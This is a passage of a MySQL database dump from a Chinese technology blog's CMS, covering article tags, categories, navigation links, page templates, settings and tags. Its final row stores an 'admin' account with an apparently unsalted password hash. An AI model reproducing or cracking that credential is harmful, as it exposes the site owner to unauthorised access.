(570, 350, 21, 0, 0),
(572, 352, 18, 0, 0),
(577, 353, 23, 0, 0),
(581, 354, 23, 0, 0),
(702, 355, 21, 0, 0),
(704, 356, 22, 0, 0),
(588, 357, 22, 0, 0),
(627, 371, 21, 0, 0),
(619, 368, 21, 0, 0),
(593, 359, 25, 0, 0),
(594, 360, 22, 0, 0),
(732, 361, 25, 0, 0),
(598, 362, 23, 0, 0),
(674, 363, 25, 0, 0),
(626, 366, 26, 0, 0),
(750, 367, 29, 0, 0),
(634, 372, 23, 0, 0),
(631, 338, 23, 0, 0),
(633, 339, 23, 0, 0),
(712, 373, 23, 0, 0),
(716, 376, 23, 0, 0),
(640, 375, 23, 0, 0),
(647, 377, 21, 0, 0),
(654, 381, 23, 0, 0),
(657, 383, 21, 0, 0),
(714, 382, 23, 0, 0),
(659, 384, 26, 0, 0),
(698, 385, 26, 0, 0),
(664, 387, 23, 0, 0),
(753, 388, 29, 0, 0),
(719, 389, 29, 0, 0),
(677, 391, 26, 0, 0),
(692, 392, 23, 0, 0),
(690, 393, 23, 0, 0),
(688, 394, 23, 0, 0),
(686, 395, 23, 0, 0),
(684, 396, 23, 0, 0),
(685, 396, 28, 0, 0),
(687, 395, 28, 0, 0),
(689, 394, 28, 0, 0),
(691, 393, 28, 0, 0),
(693, 392, 28, 0, 0),
(718, 389, 21, 0, 0),
(752, 388, 22, 0, 0),
(699, 385, 29, 0, 0),
(749, 367, 21, 0, 0),
(703, 355, 29, 0, 0),
(705, 356, 29, 0, 0),
(707, 343, 29, 0, 0),
(709, 342, 29, 0, 0),
(711, 341, 29, 0, 0),
(713, 373, 28, 0, 0),
(715, 382, 28, 0, 0),
(717, 376, 28, 0, 0),
(729, 397, 30, 0, 0),
(728, 397, 23, 0, 0),
(731, 398, 30, 0, 0),
(730, 398, 23, 0, 0),
(733, 399, 23, 0, 0),
(734, 399, 30, 0, 0),
(735, 400, 26, 0, 0),
(748, 401, 30, 0, 0),
(747, 401, 23, 0, 0),
(740, 402, 23, 0, 0),
(741, 402, 30, 0, 0),
(742, 403, 22, 0, 0),
(743, 403, 23, 0, 0),
(744, 403, 30, 0, 0),
(751, 404, 21, 0, 0),
(757, 407, 21, 0, 0),
(756, 406, 21, 0, 0),
(758, 408, 23, 0, 0),
(762, 409, 23, 0, 0),
(767, 413, 26, 0, 0),
(769, 414, 26, 0, 0),
(766, 412, 27, 0, 0),
(770, 415, 21, 0, 0),
(771, 416, 21, 0, 0),
(775, 417, 23, 0, 0),
(774, 417, 21, 0, 0),
(785, 418, 21, 0, 0),
(777, 419, 21, 0, 0),
(778, 419, 29, 0, 0),
(780, 420, 21, 0, 0),
(781, 421, 21, 0, 0),
(783, 422, 21, 0, 0),
(784, 423, 23, 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `ar_article_tag`
--

CREATE TABLE IF NOT EXISTS `ar_article_tag` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  PRIMARY KEY (`id`,`article_id`,`tag_id`),
  KEY `fk_ar_article_tag_ar_article1_idx` (`article_id`),
  KEY `fk_ar_article_tag_ar_tag1_idx` (`tag_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章-标签关联表' AUTO_INCREMENT=231 ;

--
-- 转存表中的数据 `ar_article_tag`
--

INSERT INTO `ar_article_tag` (`id`, `article_id`, `tag_id`) VALUES
(81, 325, 23),
(82, 326, 24),
(83, 327, 25),
(84, 328, 2),
(85, 328, 26),
(86, 328, 25),
(87, 329, 2),
(92, 333, 2),
(93, 333, 28),
(94, 334, 1),
(95, 334, 29),
(96, 335, 2),
(97, 336, 30),
(98, 337, 1),
(99, 338, 1),
(100, 339, 1),
(102, 340, 31),
(103, 341, 32),
(104, 342, 32),
(105, 343, 32),
(106, 344, 33),
(107, 345, 32),
(108, 346, 34),
(109, 347, 33),
(110, 348, 35),
(111, 348, 33),
(112, 345, 36),
(113, 349, 33),
(114, 349, 37),
(115, 350, 38),
(116, 350, 39),
(119, 352, 33),
(120, 353, 1),
(121, 354, 1),
(122, 355, 32),
(123, 356, 40),
(124, 357, 40),
(126, 359, 39),
(127, 359, 24),
(128, 360, 41),
(129, 361, 1),
(130, 361, 42),
(131, 361, 43),
(132, 362, 1),
(133, 362, 44),
(134, 363, 39),
(137, 366, 45),
(138, 366, 39),
(139, 367, 32),
(140, 368, 46),
(141, 368, 32),
(145, 371, 32),
(146, 372, 1),
(147, 372, 48),
(148, 373, 1),
(151, 375, 1),
(152, 375, 49),
(153, 376, 1),
(154, 377, 50),
(158, 381, 51),
(159, 381, 32),
(160, 381, 1),
(161, 382, 1),
(162, 383, 50),
(163, 384, 52),
(164, 384, 45),
(165, 385, 24),
(166, 385, 32),
(168, 387, 1),
(169, 388, 40),
(170, 389, 24),
(172, 391, 39),
(173, 392, 1),
(174, 393, 1),
(175, 393, 54),
(176, 392, 54),
(177, 394, 1),
(178, 394, 54),
(179, 395, 1),
(180, 395, 54),
(181, 396, 1),
(182, 396, 54),
(183, 397, 1),
(184, 398, 1),
(185, 399, 1),
(186, 400, 55),
(187, 401, 38),
(188, 401, 1),
(189, 401, 40),
(190, 401, 44),
(191, 401, 50),
(192, 402, 1),
(193, 402, 38),
(194, 402, 40),
(195, 403, 1),
(196, 403, 38),
(197, 403, 40),
(198, 404, 45),
(200, 406, 32),
(201, 407, 56),
(202, 408, 1),
(203, 408, 57),
(204, 409, 1),
(208, 412, 39),
(209, 412, 32),
(210, 413, 60),
(211, 414, 39),
(212, 414, 61),
(213, 415, 32),
(214, 416, 32),
(215, 416, 56),
(216, 416, 62),
(217, 417, 1),
(218, 417, 32),
(219, 417, 63),
(220, 418, 64),
(221, 418, 65),
(222, 419, 32),
(223, 419, 46),
(224, 420, 66),
(225, 420, 39),
(226, 420, 67),
(227, 421, 66),
(228, 422, 66),
(229, 423, 1),
(230, 423, 68);

-- --------------------------------------------------------

--
-- 表的结构 `ar_category`
--

CREATE TABLE IF NOT EXISTS `ar_category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(45) NOT NULL COMMENT '分类名称',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '是否可用',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章分类' AUTO_INCREMENT=32 ;

--
-- 转存表中的数据 `ar_category`
--

INSERT INTO `ar_category` (`id`, `name`, `isvalid`) VALUES
(22, '技术文章 > 数据库技术', 1),
(21, '技术文章 > 服务器技术', 1),
(20, '技术文章 > Java技术', 1),
(19, '技术文章 > 网络安全', 1),
(18, '技术文章 > 设计·前端', 1),
(23, '技术文章 > PHP技术', 1),
(24, '系统内置', 1),
(25, '日积月累', 1),
(26, '技术文章 > 其它', 1),
(27, '碎片', 1),
(28, '编程规范', 1),
(29, '实用技巧', 1),
(30, 'PHP技术系列', 1),
(31, '电子书', 1);

-- --------------------------------------------------------

--
-- 表的结构 `ar_document`
--

CREATE TABLE IF NOT EXISTS `ar_document` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `model_name` varchar(100) NOT NULL COMMENT '模型名称',
  `template` text NOT NULL COMMENT '模型模版',
  `setting` text NOT NULL COMMENT '配置',
  `intro` varchar(100) NOT NULL COMMENT '简介',
  `isvalid` char(1) NOT NULL DEFAULT '1' COMMENT '是否可用',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf32 COMMENT='文档模型' AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `ar_document`
--


-- --------------------------------------------------------

--
-- 表的结构 `ar_log`
--

CREATE TABLE IF NOT EXISTS `ar_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` int(11) DEFAULT NULL,
  `action_name` varchar(255) DEFAULT NULL,
  `operator` varchar(100) DEFAULT NULL,
  `data` text,
  `action_type` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=69 ;

--
-- 转存表中的数据 `ar_log`
--

INSERT INTO `ar_log` (`id`, `action_time`, `action_name`, `operator`, `data`, `action_type`) VALUES
(68, 1393842234, '用户cdcafe登陆了系统！', 'cdcafe', NULL, 'event');

-- --------------------------------------------------------

--
-- 表的结构 `ar_navigator`
--

CREATE TABLE IF NOT EXISTS `ar_navigator` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL COMMENT '导航名称',
  `url` varchar(200) DEFAULT NULL COMMENT '链接地址',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '是否可用',
  `intro` varchar(255) DEFAULT NULL COMMENT '简介',
  `sort` smallint(3) DEFAULT NULL COMMENT '显示顺序',
  `pid` int(11) DEFAULT '0' COMMENT '上级id\n',
  `pos` varchar(45) DEFAULT NULL COMMENT '导航位置',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='导航' AUTO_INCREMENT=58 ;

--
-- 转存表中的数据 `ar_navigator`
--

INSERT INTO `ar_navigator` (`id`, `name`, `url`, `isvalid`, `intro`, `sort`, `pid`, `pos`) VALUES
(1, '技术文章', '#', 1, NULL, 90, 0, 'top'),
(2, '归档', '#', 1, NULL, 80, 0, 'top'),
(3, '开源项目', 'page/14.html', 1, NULL, 70, 0, 'top'),
(49, 'Vision', 'http://vision.aicode.cc', 1, NULL, 55, 0, 'top'),
(48, '其它', 'category/26.html', 1, NULL, 40, 1, 'top'),
(44, '设计·前端', 'category/18.html', 1, NULL, 50, 1, 'top'),
(43, '网络安全', 'category/19.html', 1, NULL, 50, 1, 'top'),
(42, '数据库技术', 'category/22.html', 1, NULL, 50, 1, 'top'),
(41, '服务器技术', 'category/21.html', 1, NULL, 50, 1, 'top'),
(40, 'Java技术', 'category/20.html', 1, NULL, 50, 1, 'top'),
(39, 'PHP技术', 'category/23.html', 1, NULL, 50, 1, 'top'),
(21, '原创站', 'http://blog.aicode.cc', 1, NULL, 100, 0, 'top'),
(47, '走过路过', 'page/13.html', 1, NULL, 50, 0, 'top'),
(50, '日积月累', 'category/25.html', 1, NULL, 50, 2, 'top'),
(51, '碎片', 'category/27.html', 1, NULL, 50, 2, 'top'),
(52, '编程规范', 'category/28.html', 1, NULL, 50, 2, 'top'),
(53, '实用技巧', 'category/29.html', 1, NULL, 50, 2, 'top'),
(54, 'PHP技术系列', 'category/30.html', 1, NULL, 50, 2, 'top'),
(55, '订阅', 'rss.xml', 1, NULL, 5, 0, 'top'),
(57, '~.~', 'http://aicode.cc/surive.html', 1, NULL, 2, 0, 'top');

-- --------------------------------------------------------

--
-- 表的结构 `ar_page`
--

CREATE TABLE IF NOT EXISTS `ar_page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) DEFAULT NULL COMMENT '标题',
  `templates` text COMMENT '内容模板',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '是否可用',
  `creator` int(11) DEFAULT NULL COMMENT '创建者',
  `create_date` int(11) DEFAULT NULL COMMENT '创建时间',
  `updator` int(11) DEFAULT NULL COMMENT '更新者',
  `update_date` int(11) DEFAULT NULL COMMENT '更新时间',
  `attr` text COMMENT '属性',
  `alias` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `title` (`title`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='页面' AUTO_INCREMENT=16 ;

--
-- 转存表中的数据 `ar_page`
--

INSERT INTO `ar_page` (`id`, `title`, `templates`, `isvalid`, `creator`, `create_date`, `updator`, `update_date`, `attr`, `alias`) VALUES
(13, '走过路过', '<div id="main-left">\n    <div class="banner-img">\n        <img src="<?php echo \\Blog\\resources();?>uploads/woniu.jpg" />\n    </div>\n    <div class=''ds-thread'' data-thread-key="messagebox"></div>\n</div>\n<?php echo \\Blog\\right_area(''message'');?>', 1, 0, 1393503388, 0, 1419046338, 'a:0:{}', ''),
(12, '关于本站', '<div id="main-left" >\n    <div style="font-size: 320pt; text-align: center;">程序猿一枚</div>\n</div>\n<?php echo \\Blog\\right_area(''about''); ?>', 1, 0, 1393467955, 0, 1408289292, 'a:0:{}', ''),
(14, '开源项目', '<div id="main-left">\n    <div class="banner-img">\n        <img src="Resources/uploads/opensource.jpg" />\n    </div>\n    <div class="proj-list">\n        <div class="proj">\n            <h5 class="title"><a href="http://mylxsw.github.io/arsenals/" target="_blank">Arsenals开源PHP框架</a></h5>\n            <div class="meta">建立时间: 2013-11-29</div>\n            <div class="intro">\n                Arsenals采用了基于MVC的架构，同时支持Service层的扩展。系统采用了 PHP 5.3 开始支持的 命名空间 ，在开发过程中，可以实现业务代码的灵活组织，非常简单的实现 HMVC 架构，以便对业务逻辑进行分离，更加清晰的实现模块化的开发。\n                <p>本站就是采用Arsenals框架开发，相关案例还有<a href=''http://cdcafe.cc'' target="_blank">C.D.Cafe 官方网站</a> 。</p>\n            </div>\n        </div>\n        <div class="proj">\n            <h5 class="title"><a href="<?php echo \\Blog\\url(''article/319.html'');?>" target="_blank">ExcelToEntity</a></h5>\n            <div class="meta">建立时间: 2013-11-29</div>\n            <div class="intro">\n                该类库（<a href="http://mylxsw.github.io/Excel2Entity/">Excel2Entity</a>, 简称e2e）对POI对xls文件的读取进行了封装，实现了批量导入Excel中的数据时自动将数据填充到实体列表的功能， 支持字段类型校验以及自定义校验规则，可以对Excel中的数据类型合法性进行校验，同时e2e提供了一定的扩展性，可以自定义校验规则以及自定义实体对象字段类型实现更加负责的校验以及字段类型填充。\n            </div>\n        </div>\n    </div>\n</div>\n<?php echo \\Blog\\right_area(''opensource''); ?>', 1, 0, 1393514523, 0, 1419046349, 'a:0:{}', '');

-- --------------------------------------------------------

--
-- 表的结构 `ar_setting`
--

CREATE TABLE IF NOT EXISTS `ar_setting` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `setting_key` varchar(100) NOT NULL COMMENT '配置项目key',
  `setting_value` text COMMENT '配置项目value',
  `namespace` varchar(100) DEFAULT NULL COMMENT '配置项目命名空间',
  `info` varchar(255) DEFAULT NULL COMMENT '配置项目简介',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '配置项目是否可用',
  `isserialise` smallint(1) DEFAULT '1' COMMENT '是否序列化',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='系统配置' AUTO_INCREMENT=13 ;

--
-- 转存表中的数据 `ar_setting`
--

INSERT INTO `ar_setting` (`id`, `setting_key`, `setting_value`, `namespace`, `info`, `isvalid`, `isserialise`) VALUES
(2, 'custom_css', '.menu{\n	-webkit-box-shadow: 0 1px 2px 0 rgba(0,0,0,0.3);\n	-moz-box-shadow: 0 1px 2px 0 rgba(0,0,0,0.3);\n	box-shadow: 0 1px 2px 0 rgba(0,0,0,0.3);\n}\n.article .content code{\n  padding: 2px 6px;\n  font-size: 85%;\n  color: #c7254e;\n  background-color: #f9f2f4;\n  border-radius: 4px;\n}\n\n.hljs {\n    background-color: #f0f0f0!important;\n    padding: 10px!important;\n}', 'views', '自定义CSS', 1, 0),
(3, 'source_list', '[\n{"label":"原创", "value":"原创" },\n{"label":"翻译", "value":"翻译" },\n{"label":"转载", "value":"转载" },\n{"label":"专辑", "value":"专辑" },\n{"label":"其它", "value":"其它"},\n{"label":"电子书","value":"电子书"}\n]', 'system', '文章来源', 1, 1);

-- --------------------------------------------------------

--
-- 表的结构 `ar_tag`
--

CREATE TABLE IF NOT EXISTS `ar_tag` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL COMMENT '标签名',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '是否可用',
  `create_time` int(11) DEFAULT NULL COMMENT '创建时间\n',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='标签' AUTO_INCREMENT=69 ;

--
-- 转存表中的数据 `ar_tag`
--

INSERT INTO `ar_tag` (`id`, `name`, `isvalid`, `create_time`) VALUES
(1, 'PHP', 1, NULL),
(2, 'Java', 1, NULL),
(39, 'Mac', 1, 1400254166),
(38, 'Nginx', 1, 1400254166),
(37, 'promise', 1, 1399891536),
(36, '压缩', 1, 1399822704),
(35, 'html5', 1, 1399735287),
(34, 'IRC', 1, 1399435095),
(32, 'Linux', 1, 1397012254),
(31, '造字', 1, 1396945136),
(30, 'WebLogic', 1, 1396537667),
(29, 'curl', 1, 1396521682),
(28, 'SpringMVC', 1, 1396520951),
(33, 'javascript', 1, 1399385019),
(26, 'SpringRoo', 1, 1396512776),
(25, 'Maven', 1, 1396512662),
(24, 'SVN', 1, 1396512502),
(23, 'Oracle', 1, 1396512251),
(21, 'Hibernate', 1, 1393501706),
(22, 'Excel2Entity', 1, 1393516706),
(40, 'MySQL', 1, 1402656046),
(41, 'Redis', 1, 1403582889),
(42, 'Exif', 1, 1404959639),
(43, 'LBS', 1, 1404959639),
(44, 'Xdebug', 1, 1405317585),
(45, 'Python', 1, 1405570661),
(46, 'SSH', 1, 1407981761),
(48, 'Laravel', 1, 1408286153),
(49, 'Annontation', 1, 1408377547),
(50, 'Vagrant', 1, 1408547691),
(51, 'yaf', 1, 1408680702),
(52, 'json', 1, 1409826455),
(53, 'http', 1, 1413463775),
(54, 'PSR', 1, 1413943157),
(55, 'QT', 1, 1416796780),
(56, 'Apache', 1, 1419074442),
(57, 'XHProf', 1, 1419157551),
(66, 'Docker', 1, 1432031775),
(59, '移动的迷宫', 1, 1419848926),
(60, 'YAML', 1, 1421132259),
(61, 'valgrind', 1, 1421682859),
(62, 'httpd', 1, 1425604737),
(63, 'rsyslog', 1, 1425977143),
(64, 'TCP', 1, 1427860513),
(65, 'TIME_WAIT', 1, 1427860513),
(67, 'boot2docker', 1, 1432031775),
(68, 'yield', 1, 1433411002);

-- --------------------------------------------------------

--
-- 表的结构 `ar_urlmap`
--

CREATE TABLE IF NOT EXISTS `ar_urlmap` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `isvalid` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `key` (`key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `ar_urlmap`
--


-- --------------------------------------------------------

--
-- 表的结构 `ar_user`
--

CREATE TABLE IF NOT EXISTS `ar_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(128) DEFAULT NULL,
  `role` varchar(255) DEFAULT NULL,
  `isvalid` tinyint(1) DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `UNIQUE_USERNAME` (`username`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `ar_user`
--

INSERT INTO `ar_user` (`id`, `username`, `password`, `role`, `isvalid`) VALUES
(1, 'admin', 'b3aca92c793ee0e9b1a9b0a5f5fc044e05140df3', 'admin', 1);
